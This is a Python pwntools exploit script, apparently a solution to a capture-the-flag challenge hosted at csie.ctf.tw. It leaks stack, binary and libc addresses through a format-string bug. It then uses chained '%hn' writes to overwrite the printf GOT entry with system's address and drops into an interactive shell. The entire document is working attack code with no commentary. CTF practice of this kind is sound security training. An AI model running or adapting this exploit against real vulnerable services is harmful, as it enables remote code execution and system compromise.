from pwn import *
from time import *

r = remote("csie.ctf.tw", 10130)

###Useful address
#rdi rdx rcx r8 r9 stack->
start_main_addr = 0#%11p -231
start_main_offset = 0x21ab0
system_offset = 0x4f440
printf_got_code_offset = 0x200da8
stderr_code_offset = 0x200e20
stderr_addr = 0#%1p
write_addr = 0#%8p
ptr_to_write_addr = 0#%6p

###Leak data + Calculate address
r.recvuntil('\n')
p = b'%1$pAAA%11$pBBB%8$pCCC%6$pDDD'
r.send(p)
sleep(0.5)
a = r.recv()
stderr_addr = int(a[:a.find(b'AAA')],16)
start_main_addr = int(a[a.find(b'AAA')+5:a.find(b'BBB')],16)-231
write_addr = int(a[a.find(b'BBB')+5:a.find(b'CCC')],16)     ####target
ptr_to_write_addr = int(a[a.find(b'CCC')+5:a.find(b'DDD')],16)    ####target
code_base = stderr_addr-stderr_code_offset
printf_got_addr = code_base+printf_got_code_offset    ####target
libc_base = start_main_addr-start_main_offset
system_addr = libc_base+system_offset       ####target

prnt_byte = []
rec = hex(printf_got_addr)
for i in range(4):
    prnt_byte.append(printf_got_addr%65536)
    printf_got_addr//=65536
for i in range(8):
    if i==4:
        prnt_byte[0]+=2
    p = b'%'+str(prnt_byte[i%4]).encode('utf-8')+b'c%8$hn'
    if prnt_byte[i%4]==0:
        p = b'%8$hn'
    r.send(p)
    sleep(0.5)
    write_addr+=2
    write_addr_Lw = write_addr%65536
    p = b'%'+str(write_addr_Lw).encode('utf-8')+b'c%6$hn'
    if write_addr_Lw==0:
        p = b'%6$hn'
    r.send(p)
    sleep(0.5)
systm_byte = []
for i in range(2):
    systm_byte.append([system_addr%65536,10+i])
    system_addr//=65536
systm_byte = sorted(systm_byte)
num = systm_byte[1][0]-systm_byte[0][0]
systm_byte[1][0] = num
p = b''
for i in range(2):
    p+=b'%'+str(systm_byte[i][0]).encode('utf-8')+b'c%'+str(systm_byte[i][1]).encode('utf-8')+b'$hn'
r.send(p)
sleep(0.5)

r.interactive()
